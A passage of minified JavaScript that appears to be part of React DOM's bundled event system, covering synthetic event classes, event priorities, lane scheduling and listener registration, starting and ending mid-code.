W_=vt({menuitem:!0},{area:!0,base:!0,br:!0,col:!0,embed:!0,hr:!0,img:!0,input:!0,keygen:!0,link:!0,meta:!0,param:!0,source:!0,track:!0,wbr:!0});function wu(t,e){if(e){if(W_[t]&&(e.children!=null||e.dangerouslySetInnerHTML!=null))throw Error(se(137,t));if(e.dangerouslySetInnerHTML!=null){if(e.children!=null)throw Error(se(60));if(typeof e.dangerouslySetInnerHTML!="object"||!("__html"in e.dangerouslySetInnerHTML))throw Error(se(61))}if(e.style!=null&&typeof e.style!="object")throw Error(se(62))}}function Eu(t,e){if(t.indexOf("-")===-1)return typeof e.is=="string";switch(t){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}var Mu=null;function pp(t){return t=t.target||t.srcElement||window,t.correspondingUseElement&&(t=t.correspondingUseElement),t.nodeType===3?t.parentNode:t}var Tu=null,_r=null,xr=null;function Nh(t){if(t=$a(t)){if(typeof Tu!="function")throw Error(se(280));var e=t.stateNode;e&&(e=Hl(e),Tu(t.stateNode,t.type,e))}}function vg(t){_r?xr?xr.push(t):xr=[t]:_r=t}function _g(){if(_r){var t=_r,e=xr;if(xr=_r=null,Nh(t),e)for(t=0;t<e.length;t++)Nh(e[t])}}function xg(t,e){return t(e)}function yg(){}var dc=!1;function Sg(t,e,n){if(dc)return t(e,n);dc=!0;try{return xg(t,e,n)}finally{dc=!1,(_r!==null||xr!==null)&&(yg(),_g())}}function wa(t,e){var n=t.stateNode;if(n===null)return null;var i=Hl(n);if(i===null)return null;n=i[e];e:switch(e){case"onClick":case"onClickCapture":case"onDoubleClick":case"onDoubleClickCapture":case"onMouseDown":case"onMouseDownCapture":case"onMouseMove":case"onMouseMoveCapture":case"onMouseUp":case"onMouseUpCapture":case"onMouseEnter":(i=!i.disabled)||(t=t.type,i=!(t==="button"||t==="input"||t==="select"||t==="textarea")),t=!i;break e;default:t=!1}if(t)return null;if(n&&typeof n!="function")throw Error(se(231,e,typeof n));return n}var Au=!1;if(Ai)try{var jr={};Object.defineProperty(jr,"passive",{get:function(){Au=!0}}),window.addEventListener("test",jr,jr),window.removeEventListener("test",jr,jr)}catch{Au=!1}function j_(t,e,n,i,s,r,a,o,l){var c=Array.prototype.slice.call(arguments,3);try{e.apply(n,c)}catch(p){this.onError(p)}}var ha=!1,cl=null,ul=!1,Cu=null,X_={onError:function(t){ha=!0,cl=t}};function q_(t,e,n,i,s,r,a,o,l){ha=!1,cl=null,j_.apply(X_,arguments)}function Y_(t,e,n,i,s,r,a,o,l){if(q_.apply(this,arguments),ha){if(ha){var c=cl;ha=!1,cl=null}else throw Error(se(198));ul||(ul=!0,Cu=c)}}function zs(t){var e=t,n=t;if(t.alternate)for(;e.return;)e=e.return;else{t=e;do e=t,e.flags&4098&&(n=e.return),t=e.return;while(t)}return e.tag===3?n:null}function bg(t){if(t.tag===13){var e=t.memoizedState;if(e===null&&(t=t.alternate,t!==null&&(e=t.memoizedState)),e!==null)return e.dehydrated}return null}function Ih(t){if(zs(t)!==t)throw Error(se(188))}function $_(t){var e=t.alternate;if(!e){if(e=zs(t),e===null)throw Error(se(188));return e!==t?null:t}for(var n=t,i=e;;){var s=n.return;if(s===null)break;var r=s.alternate;if(r===null){if(i=s.return,i!==null){n=i;continue}break}if(s.child===r.child){for(r=s.child;r;){if(r===n)return Ih(s),t;if(r===i)return Ih(s),e;r=r.sibling}throw Error(se(188))}if(n.return!==i.return)n=s,i=r;else{for(var a=!1,o=s.child;o;){if(o===n){a=!0,n=s,i=r;break}if(o===i){a=!0,i=s,n=r;break}o=o.sibling}if(!a){for(o=r.child;o;){if(o===n){a=!0,n=r,i=s;break}if(o===i){a=!0,i=r,n=s;break}o=o.sibling}if(!a)throw Error(se(189))}}if(n.alternate!==i)throw Error(se(190))}if(n.tag!==3)throw Error(se(188));return n.stateNode.current===n?t:e}function wg(t){return t=$_(t),t!==null?Eg(t):null}function Eg(t){if(t.tag===5||t.tag===6)return t;for(t=t.child;t!==null;){var e=Eg(t);if(e!==null)return e;t=t.sibling}return null}var Mg=wn.unstable_scheduleCallback,Dh=wn.unstable_cancelCallback,K_=wn.unstable_shouldYield,Z_=wn.unstable_requestPaint,wt=wn.unstable_now,J_=wn.unstable_getCurrentPriorityLevel,hp=wn.unstable_ImmediatePriority,Tg=wn.unstable_UserBlockingPriority,dl=wn.unstable_NormalPriority,Q_=wn.unstable_LowPriority,Ag=wn.unstable_IdlePriority,Fl=null,si=null;function ex(t){if(si&&typeof si.onCommitFiberRoot=="function")try{si.onCommitFiberRoot(Fl,t,void 0,(t.current.flags&128)===128)}catch{}}var Xn=Math.clz32?Math.clz32:ix,tx=Math.log,nx=Math.LN2;function ix(t){return t>>>=0,t===0?32:31-(tx(t)/nx|0)|0}var uo=64,po=4194304;function oa(t){switch(t&-t){case 1:return 1;case 2:return 2;case 4:return 4;case 8:return 8;case 16:return 16;case 32:return 32;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return t&4194240;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return t&130023424;case 134217728:return 134217728;case 268435456:return 268435456;case 536870912:return 536870912;case 1073741824:return 1073741824;default:return t}}function pl(t,e){var n=t.pendingLanes;if(n===0)return 0;var i=0,s=t.suspendedLanes,r=t.pingedLanes,a=n&268435455;if(a!==0){var o=a&~s;o!==0?i=oa(o):(r&=a,r!==0&&(i=oa(r)))}else a=n&~s,a!==0?i=oa(a):r!==0&&(i=oa(r));if(i===0)return 0;if(e!==0&&e!==i&&!(e&s)&&(s=i&-i,r=e&-e,s>=r||s===16&&(r&4194240)!==0))return e;if(i&4&&(i|=n&16),e=t.entangledLanes,e!==0)for(t=t.entanglements,e&=i;0<e;)n=31-Xn(e),s=1<<n,i|=t[n],e&=~s;return i}function sx(t,e){switch(t){case 1:case 2:case 4:return e+250;case 8:case 16:case 32:case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return e+5e3;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return-1;case 134217728:case 268435456:case 536870912:case 1073741824:return-1;default:return-1}}function rx(t,e){for(var n=t.suspendedLanes,i=t.pingedLanes,s=t.expirationTimes,r=t.pendingLanes;0<r;){var a=31-Xn(r),o=1<<a,l=s[a];l===-1?(!(o&n)||o&i)&&(s[a]=sx(o,e)):l<=e&&(t.expiredLanes|=o),r&=~o}}function Ru(t){return t=t.pendingLanes&-1073741825,t!==0?t:t&1073741824?1073741824:0}function Cg(){var t=uo;return uo<<=1,!(uo&4194240)&&(uo=64),t}function pc(t){for(var e=[],n=0;31>n;n++)e.push(t);return e}function qa(t,e,n){t.pendingLanes|=e,e!==536870912&&(t.suspendedLanes=0,t.pingedLanes=0),t=t.eventTimes,e=31-Xn(e),t[e]=n}function ax(t,e){var n=t.pendingLanes&~e;t.pendingLanes=e,t.suspendedLanes=0,t.pingedLanes=0,t.expiredLanes&=e,t.mutableReadLanes&=e,t.entangledLanes&=e,e=t.entanglements;var i=t.eventTimes;for(t=t.expirationTimes;0<n;){var s=31-Xn(n),r=1<<s;e[s]=0,i[s]=-1,t[s]=-1,n&=~r}}function fp(t,e){var n=t.entangledLanes|=e;for(t=t.entanglements;n;){var i=31-Xn(n),s=1<<i;s&e|t[i]&e&&(t[i]|=e),n&=~s}}var st=0;function Rg(t){return t&=-t,1<t?4<t?t&268435455?16:536870912:4:1}var Pg,mp,kg,Lg,Ng,Pu=!1,ho=[],Zi=null,Ji=null,Qi=null,Ea=new Map,Ma=new Map,Wi=[],ox="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(" ");function Uh(t,e){switch(t){case"focusin":case"focusout":Zi=null;break;case"dragenter":case"dragleave":Ji=null;break;case"mouseover":case"mouseout":Qi=null;break;case"pointerover":case"pointerout":Ea.delete(e.pointerId);break;case"gotpointercapture":case"lostpointercapture":Ma.delete(e.pointerId)}}function Xr(t,e,n,i,s,r){return t===null||t.nativeEvent!==r?(t={blockedOn:e,domEventName:n,eventSystemFlags:i,nativeEvent:r,targetContainers:[s]},e!==null&&(e=$a(e),e!==null&&mp(e)),t):(t.eventSystemFlags|=i,e=t.targetContainers,s!==null&&e.indexOf(s)===-1&&e.push(s),t)}function lx(t,e,n,i,s){switch(e){case"focusin":return Zi=Xr(Zi,t,e,n,i,s),!0;case"dragenter":return Ji=Xr(Ji,t,e,n,i,s),!0;case"mouseover":return Qi=Xr(Qi,t,e,n,i,s),!0;case"pointerover":var r=s.pointerId;return Ea.set(r,Xr(Ea.get(r)||null,t,e,n,i,s)),!0;case"gotpointercapture":return r=s.pointerId,Ma.set(r,Xr(Ma.get(r)||null,t,e,n,i,s)),!0}return!1}function Ig(t){var e=Ts(t.target);if(e!==null){var n=zs(e);if(n!==null){if(e=n.tag,e===13){if(e=bg(n),e!==null){t.blockedOn=e,Ng(t.priority,function(){kg(n)});return}}else if(e===3&&n.stateNode.current.memoizedState.isDehydrated){t.blockedOn=n.tag===3?n.stateNode.containerInfo:null;return}}}t.blockedOn=null}function Xo(t){if(t.blockedOn!==null)return!1;for(var e=t.targetContainers;0<e.length;){var n=ku(t.domEventName,t.eventSystemFlags,e[0],t.nativeEvent);if(n===null){n=t.nativeEvent;var i=new n.constructor(n.type,n);Mu=i,n.target.dispatchEvent(i),Mu=null}else return e=$a(n),e!==null&&mp(e),t.blockedOn=n,!1;e.shift()}return!0}function Oh(t,e,n){Xo(t)&&n.delete(e)}function cx(){Pu=!1,Zi!==null&&Xo(Zi)&&(Zi=null),Ji!==null&&Xo(Ji)&&(Ji=null),Qi!==null&&Xo(Qi)&&(Qi=null),Ea.forEach(Oh),Ma.forEach(Oh)}function qr(t,e){t.blockedOn===e&&(t.blockedOn=null,Pu||(Pu=!0,wn.unstable_scheduleCallback(wn.unstable_NormalPriority,cx)))}function Ta(t){function e(s){return qr(s,t)}if(0<ho.length){qr(ho[0],t);for(var n=1;n<ho.length;n++){var i=ho[n];i.blockedOn===t&&(i.blockedOn=null)}}for(Zi!==null&&qr(Zi,t),Ji!==null&&qr(Ji,t),Qi!==null&&qr(Qi,t),Ea.forEach(e),Ma.forEach(e),n=0;n<Wi.length;n++)i=Wi[n],i.blockedOn===t&&(i.blockedOn=null);for(;0<Wi.length&&(n=Wi[0],n.blockedOn===null);)Ig(n),n.blockedOn===null&&Wi.shift()}var yr=Ni.ReactCurrentBatchConfig,hl=!0;function ux(t,e,n,i){var s=st,r=yr.transition;yr.transition=null;try{st=1,gp(t,e,n,i)}finally{st=s,yr.transition=r}}function dx(t,e,n,i){var s=st,r=yr.transition;yr.transition=null;try{st=4,gp(t,e,n,i)}finally{st=s,yr.transition=r}}function gp(t,e,n,i){if(hl){var s=ku(t,e,n,i);if(s===null)bc(t,e,i,fl,n),Uh(t,i);else if(lx(s,t,e,n,i))i.stopPropagation();else if(Uh(t,i),e&4&&-1<ox.indexOf(t)){for(;s!==null;){var r=$a(s);if(r!==null&&Pg(r),r=ku(t,e,n,i),r===null&&bc(t,e,i,fl,n),r===s)break;s=r}s!==null&&i.stopPropagation()}else bc(t,e,i,null,n)}}var fl=null;function ku(t,e,n,i){if(fl=null,t=pp(i),t=Ts(t),t!==null)if(e=zs(t),e===null)t=null;else if(n=e.tag,n===13){if(t=bg(e),t!==null)return t;t=null}else if(n===3){if(e.stateNode.current.memoizedState.isDehydrated)return e.tag===3?e.stateNode.containerInfo:null;t=null}else e!==t&&(t=null);return fl=t,null}function Dg(t){switch(t){case"cancel":case"click":case"close":case"contextmenu":case"copy":case"cut":case"auxclick":case"dblclick":case"dragend":case"dragstart":case"drop":case"focusin":case"focusout":case"input":case"invalid":case"keydown":case"keypress":case"keyup":case"mousedown":case"mouseup":case"paste":case"pause":case"play":case"pointercancel":case"pointerdown":case"pointerup":case"ratechange":case"reset":case"resize":case"seeked":case"submit":case"touchcancel":case"touchend":case"touchstart":case"volumechange":case"change":case"selectionchange":case"textInput":case"compositionstart":case"compositionend":case"compositionupdate":case"beforeblur":case"afterblur":case"beforeinput":case"blur":case"fullscreenchange":case"focus":case"hashchange":case"popstate":case"select":case"selectstart":return 1;case"drag":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"mousemove":case"mouseout":case"mouseover":case"pointermove":case"pointerout":case"pointerover":case"scroll":case"toggle":case"touchmove":case"wheel":case"mouseenter":case"mouseleave":case"pointerenter":case"pointerleave":return 4;case"message":switch(J_()){case hp:return 1;case Tg:return 4;case dl:case Q_:return 16;case Ag:return 536870912;default:return 16}default:return 16}}var qi=null,vp=null,qo=null;function Ug(){if(qo)return qo;var t,e=vp,n=e.length,i,s="value"in qi?qi.value:qi.textContent,r=s.length;for(t=0;t<n&&e[t]===s[t];t++);var a=n-t;for(i=1;i<=a&&e[n-i]===s[r-i];i++);return qo=s.slice(t,1<i?1-i:void 0)}function Yo(t){var e=t.keyCode;return"charCode"in t?(t=t.charCode,t===0&&e===13&&(t=13)):t=e,t===10&&(t=13),32<=t||t===13?t:0}function fo(){return!0}function Fh(){return!1}function Mn(t){function e(n,i,s,r,a){this._reactName=n,this._targetInst=s,this.type=i,this.nativeEvent=r,this.target=a,this.currentTarget=null;for(var o in t)t.hasOwnProperty(o)&&(n=t[o],this[o]=n?n(r):r[o]);return this.isDefaultPrevented=(r.defaultPrevented!=null?r.defaultPrevented:r.returnValue===!1)?fo:Fh,this.isPropagationStopped=Fh,this}return vt(e.prototype,{preventDefault:function(){this.defaultPrevented=!0;var n=this.nativeEvent;n&&(n.preventDefault?n.preventDefault():typeof n.returnValue!="unknown"&&(n.returnValue=!1),this.isDefaultPrevented=fo)},stopPropagation:function(){var n=this.nativeEvent;n&&(n.stopPropagation?n.stopPropagation():typeof n.cancelBubble!="unknown"&&(n.cancelBubble=!0),this.isPropagationStopped=fo)},persist:function(){},isPersistent:fo}),e}var Fr={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(t){return t.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},_p=Mn(Fr),Ya=vt({},Fr,{view:0,detail:0}),px=Mn(Ya),hc,fc,Yr,Bl=vt({},Ya,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:xp,button:0,buttons:0,relatedTarget:function(t){return t.relatedTarget===void 0?t.fromElement===t.srcElement?t.toElement:t.fromElement:t.relatedTarget},movementX:function(t){return"movementX"in t?t.movementX:(t!==Yr&&(Yr&&t.type==="mousemove"?(hc=t.screenX-Yr.screenX,fc=t.screenY-Yr.screenY):fc=hc=0,Yr=t),hc)},movementY:function(t){return"movementY"in t?t.movementY:fc}}),Bh=Mn(Bl),hx=vt({},Bl,{dataTransfer:0}),fx=Mn(hx),mx=vt({},Ya,{relatedTarget:0}),mc=Mn(mx),gx=vt({},Fr,{animationName:0,elapsedTime:0,pseudoElement:0}),vx=Mn(gx),_x=vt({},Fr,{clipboardData:function(t){return"clipboardData"in t?t.clipboardData:window.clipboardData}}),xx=Mn(_x),yx=vt({},Fr,{data:0}),zh=Mn(yx),Sx={Esc:"Escape",Spacebar:" ",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},bx={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",224:"Meta"},wx={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function Ex(t){var e=this.nativeEvent;return e.getModifierState?e.getModifierState(t):(t=wx[t])?!!e[t]:!1}function xp(){return Ex}var Mx=vt({},Ya,{key:function(t){if(t.key){var e=Sx[t.key]||t.key;if(e!=="Unidentified")return e}return t.type==="keypress"?(t=Yo(t),t===13?"Enter":String.fromCharCode(t)):t.type==="keydown"||t.type==="keyup"?bx[t.keyCode]||"Unidentified":""},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:xp,charCode:function(t){return t.type==="keypress"?Yo(t):0},keyCode:function(t){return t.type==="keydown"||t.type==="keyup"?t.keyCode:0},which:function(t){return t.type==="keypress"?Yo(t):t.type==="keydown"||t.type==="keyup"?t.keyCode:0}}),Tx=Mn(Mx),Ax=vt({},Bl,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0}),Vh=Mn(Ax),Cx=vt({},Ya,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:xp}),Rx=Mn(Cx),Px=vt({},Fr,{propertyName:0,elapsedTime:0,pseudoElement:0}),kx=Mn(Px),Lx=vt({},Bl,{deltaX:function(t){return"deltaX"in t?t.deltaX:"wheelDeltaX"in t?-t.wheelDeltaX:0},deltaY:function(t){return"deltaY"in t?t.deltaY:"wheelDeltaY"in t?-t.wheelDeltaY:"wheelDelta"in t?-t.wheelDelta:0},deltaZ:0,deltaMode:0}),Nx=Mn(Lx),Ix=[9,13,27,32],yp=Ai&&"CompositionEvent"in window,fa=null;Ai&&"documentMode"in document&&(fa=document.documentMode);var Dx=Ai&&"TextEvent"in window&&!fa,Og=Ai&&(!yp||fa&&8<fa&&11>=fa),Hh=" ",Gh=!1;function Fg(t,e){switch(t){case"keyup":return Ix.indexOf(e.keyCode)!==-1;case"keydown":return e.keyCode!==229;case"keypress":case"mousedown":case"focusout":return!0;default:return!1}}function Bg(t){return t=t.detail,typeof t=="object"&&"data"in t?t.data:null}var ar=!1;function Ux(t,e){switch(t){case"compositionend":return Bg(e);case"keypress":return e.which!==32?null:(Gh=!0,Hh);case"textInput":return t=e.data,t===Hh&&Gh?null:t;default:return null}}function Ox(t,e){if(ar)return t==="compositionend"||!yp&&Fg(t,e)?(t=Ug(),qo=vp=qi=null,ar=!1,t):null;switch(t){case"paste":return null;case"keypress":if(!(e.ctrlKey||e.altKey||e.metaKey)||e.ctrlKey&&e.altKey){if(e.char&&1<e.char.length)return e.char;if(e.which)return String.fromCharCode(e.which)}return null;case"compositionend":return Og&&e.locale!=="ko"?null:e.data;default:return null}}var Fx={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function Wh(t){var e=t&&t.nodeName&&t.nodeName.toLowerCase();return e==="input"?!!Fx[t.type]:e==="textarea"}function zg(t,e,n,i){vg(i),e=ml(e,"onChange"),0<e.length&&(n=new _p("onChange","change",null,n,i),t.push({event:n,listeners:e}))}var ma=null,Aa=null;function Bx(t){Zg(t,0)}function zl(t){var e=cr(t);if(ug(e))return t}function zx(t,e){if(t==="change")return e}var Vg=!1;if(Ai){var gc;if(Ai){var vc="oninput"in document;if(!vc){var jh=document.createElement("div");jh.setAttribute("oninput","return;"),vc=typeof jh.oninput=="function"}gc=vc}else gc=!1;Vg=gc&&(!document.documentMode||9<document.documentMode)}function Xh(){ma&&(ma.detachEvent("onpropertychange",Hg),Aa=ma=null)}function Hg(t){if(t.propertyName==="value"&&zl(Aa)){var e=[];zg(e,Aa,t,pp(t)),Sg(Bx,e)}}function Vx(t,e,n){t==="focusin"?(Xh(),ma=e,Aa=n,ma.attachEvent("onpropertychange",Hg)):t==="focusout"&&Xh()}function Hx(t){if(t==="selectionchange"||t==="keyup"||t==="keydown")return zl(Aa)}function Gx(t,e){if(t==="click")return zl(e)}function Wx(t,e){if(t==="input"||t==="change")return zl(e)}function jx(t,e){return t===e&&(t!==0||1/t===1/e)||t!==t&&e!==e}var Yn=typeof Object.is=="function"?Object.is:jx;function Ca(t,e){if(Yn(t,e))return!0;if(typeof t!="object"||t===null||typeof e!="object"||e===null)return!1;var n=Object.keys(t),i=Object.keys(e);if(n.length!==i.length)return!1;for(i=0;i<n.length;i++){var s=n[i];if(!hu.call(e,s)||!Yn(t[s],e[s]))return!1}return!0}function qh(t){for(;t&&t.firstChild;)t=t.firstChild;return t}function Yh(t,e){var n=qh(t);t=0;for(var i;n;){if(n.nodeType===3){if(i=t+n.textContent.length,t<=e&&i>=e)return{node:n,offset:e-t};t=i}e:{for(;n;){if(n.nextSibling){n=n.nextSibling;break e}n=n.parentNode}n=void 0}n=qh(n)}}function Gg(t,e){return t&&e?t===e?!0:t&&t.nodeType===3?!1:e&&e.nodeType===3?Gg(t,e.parentNode):"contains"in t?t.contains(e):t.compareDocumentPosition?!!(t.compareDocumentPosition(e)&16):!1:!1}function Wg(){for(var t=window,e=ll();e instanceof t.HTMLIFrameElement;){try{var n=typeof e.contentWindow.location.href=="string"}catch{n=!1}if(n)t=e.contentWindow;else break;e=ll(t.document)}return e}function Sp(t){var e=t&&t.nodeName&&t.nodeName.toLowerCase();return e&&(e==="input"&&(t.type==="text"||t.type==="search"||t.type==="tel"||t.type==="url"||t.type==="password")||e==="textarea"||t.contentEditable==="true")}function Xx(t){var e=Wg(),n=t.focusedElem,i=t.selectionRange;if(e!==n&&n&&n.ownerDocument&&Gg(n.ownerDocument.documentElement,n)){if(i!==null&&Sp(n)){if(e=i.start,t=i.end,t===void 0&&(t=e),"selectionStart"in n)n.selectionStart=e,n.selectionEnd=Math.min(t,n.value.length);else if(t=(e=n.ownerDocument||document)&&e.defaultView||window,t.getSelection){t=t.getSelection();var s=n.textContent.length,r=Math.min(i.start,s);i=i.end===void 0?r:Math.min(i.end,s),!t.extend&&r>i&&(s=i,i=r,r=s),s=Yh(n,r);var a=Yh(n,i);s&&a&&(t.rangeCount!==1||t.anchorNode!==s.node||t.anchorOffset!==s.offset||t.focusNode!==a.node||t.focusOffset!==a.offset)&&(e=e.createRange(),e.setStart(s.node,s.offset),t.removeAllRanges(),r>i?(t.addRange(e),t.extend(a.node,a.offset)):(e.setEnd(a.node,a.offset),t.addRange(e)))}}for(e=[],t=n;t=t.parentNode;)t.nodeType===1&&e.push({element:t,left:t.scrollLeft,top:t.scrollTop});for(typeof n.focus=="function"&&n.focus(),n=0;n<e.length;n++)t=e[n],t.element.scrollLeft=t.left,t.element.scrollTop=t.top}}var qx=Ai&&"documentMode"in document&&11>=document.documentMode,or=null,Lu=null,ga=null,Nu=!1;function $h(t,e,n){var i=n.window===n?n.document:n.nodeType===9?n:n.ownerDocument;Nu||or==null||or!==ll(i)||(i=or,"selectionStart"in i&&Sp(i)?i={start:i.selectionStart,end:i.selectionEnd}:(i=(i.ownerDocument&&i.ownerDocument.defaultView||window).getSelection(),i={anchorNode:i.anchorNode,anchorOffset:i.anchorOffset,focusNode:i.focusNode,focusOffset:i.focusOffset}),ga&&Ca(ga,i)||(ga=i,i=ml(Lu,"onSelect"),0<i.length&&(e=new _p("onSelect","select",null,e,n),t.push({event:e,listeners:i}),e.target=or)))}function mo(t,e){var n={};return n[t.toLowerCase()]=e.toLowerCase(),n["Webkit"+t]="webkit"+e,n["Moz"+t]="moz"+e,n}var lr={animationend:mo("Animation","AnimationEnd"),animationiteration:mo("Animation","AnimationIteration"),animationstart:mo("Animation","AnimationStart"),transitionend:mo("Transition","TransitionEnd")},_c={},jg={};Ai&&(jg=document.createElement("div").style,"AnimationEvent"in window||(delete lr.animationend.animation,delete lr.animationiteration.animation,delete lr.animationstart.animation),"TransitionEvent"in window||delete lr.transitionend.transition);function Vl(t){if(_c[t])return _c[t];if(!lr[t])return t;var e=lr[t],n;for(n in e)if(e.hasOwnProperty(n)&&n in jg)return _c[t]=e[n];return t}var Xg=Vl("animationend"),qg=Vl("animationiteration"),Yg=Vl("animationstart"),$g=Vl("transitionend"),Kg=new Map,Kh="abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");function cs(t,e){Kg.set(t,e),Bs(e,[t])}for(var xc=0;xc<Kh.length;xc++){var yc=Kh[xc],Yx=yc.toLowerCase(),$x=yc[0].toUpperCase()+yc.slice(1);cs(Yx,"on"+$x)}cs(Xg,"onAnimationEnd");cs(qg,"onAnimationIteration");cs(Yg,"onAnimationStart");cs("dblclick","onDoubleClick");cs("focusin","onFocus");cs("focusout","onBlur");cs($g,"onTransitionEnd");Mr("onMouseEnter",["mouseout","mouseover"]);Mr("onMouseLeave",["mouseout","mouseover"]);Mr("onPointerEnter",["pointerout","pointerover"]);Mr("onPointerLeave",["pointerout","pointerover"]);Bs("onChange","change click focusin focusout input keydown keyup selectionchange".split(" "));Bs("onSelect","focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" "));Bs("onBeforeInput",["compositionend","keypress","textInput","paste"]);Bs("onCompositionEnd","compositionend focusout keydown keypress keyup mousedown".split(" "));Bs("onCompositionStart","compositionstart focusout keydown keypress keyup mousedown".split(" "));Bs("onCompositionUpdate","compositionupdate focusout keydown keypress keyup mousedown".split(" "));var la="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),Kx=new Set("cancel close invalid load scroll toggle".split(" ").concat(la));function Zh(t,e,n){var i=t.type||"unknown-event";t.currentTarget=n,Y_(i,e,void 0,t),t.currentTarget=null}function Zg(t,e){e=(e&4)!==0;for(var n=0;n<t.length;n++){var i=t[n],s=i.event;i=i.listeners;e:{var r=void 0;if(e)for(var a=i.length-1;0<=a;a--){var o=i[a],l=o.instance,c=o.currentTarget;if(o=o.listener,l!==r&&s.isPropagationStopped())break e;Zh(s,o,c),r=l}else for(a=0;a<i.length;a++){if(o=i[a],l=o.instance,c=o.currentTarget,o=o.listener,l!==r&&s.isPropagationStopped())break e;Zh(s,o,c),r=l}}}if(ul)throw t=Cu,ul=!1,Cu=null,t}function pt(t,e){var n=e[Fu];n===void 0&&(n=e[Fu]=new Set);var i=t+"__bubble";n.has(i)||(Jg(e,t,2,!1),n.add(i))}function Sc(t,e,n){var i=0;e&&(i|=4),Jg(n,t,i,e)}var go="_reactListening"+Math.random().toString(36).slice(2);function Ra(t){if(!t[go]){t[go]=!0,rg.forEach(function(n){n!=="selectionchange"&&(Kx.has(n)||Sc(n,!1,t),Sc(n,!0,t))});var e=t.nodeType===9?t:t.ownerDocument;e===null||e[go]||(e[go]=!0,Sc("selectionchange",!1,e))}}function Jg(t,e,n,i){switch(Dg(e)){case 1:var s=ux;break;case 4:s=dx;break;default:s=gp}n=s.bind(null,e,n,t),s=void 0,!Au||e!=="touchstart"&&e!=="touchmove"&&e!=="wheel"||(s=!0),i?s!==void 0?t.addEventListener(e,n,{capture:!0,passive:s}):t.addEventListener(e,n,!0):s!==void 0?t.addEventListener(e,n,{passive:s}):t.addEventListener(e,n,!1)}function bc(t,e,n,i,s){var r=i;if(!(e&1)&&!(e&2)&&i!==null)e:for(;;){if(i===null)return;var a=i.tag;if(a===3||a===4){var o=i.stateNode.containerInfo;if(o===s||o.nodeType===8&&o.parentNode===s)break;if(a===4)for(a=i.return;a!==null;){var l=a.tag;if((l===3||l===4)&&(l=a.stateNode.containerInfo,l===s||l.nodeType===8&&l.parentNode===s))return;a=a.return}for(;o!==null;){if(a=Ts(o),a===null)return;if(l=a.tag,l===5||l===6){i=r=a;continue e}o=o.parentNode}}i=i.return}Sg(function(){var c=r,p=pp(n),d=[];e:{var h=Kg.get(t);if(h!==void 0){var f=_p,v=t;switch(t){case"keypress":if(Yo(n)===0)break e;case"keydown":case"keyup":f=Tx;break;case"focusin":v="focus",f=mc;break;case"focusout":v="blur",f=mc;break;case"beforeblur":case"afterblur":f=mc;break;case"click":if(n.button===2)break e;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":f=Bh;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":f=fx;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":f=Rx;break;case Xg:case qg:case Yg:f=vx;break;case $g:f=kx;break;case"scroll":f=px;break;case"wheel":f=Nx;break;case"copy":case"cut":case"paste":f=xx;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":f=Vh}var y=(e&4)!==0,m=!y&&t==="scroll",u=y?h!==null?h+"Capture":null:h;y=[];for(var g=c,_;g!==null;){_=g;var b=_.stateNode;if(_.tag===5&&b!==null&&(_=b,u!==null&&(b=wa(g,u),b!=null&&y.push(Pa(g,b,_)))),m)break;g=g.return}0<y.length&&(h=new 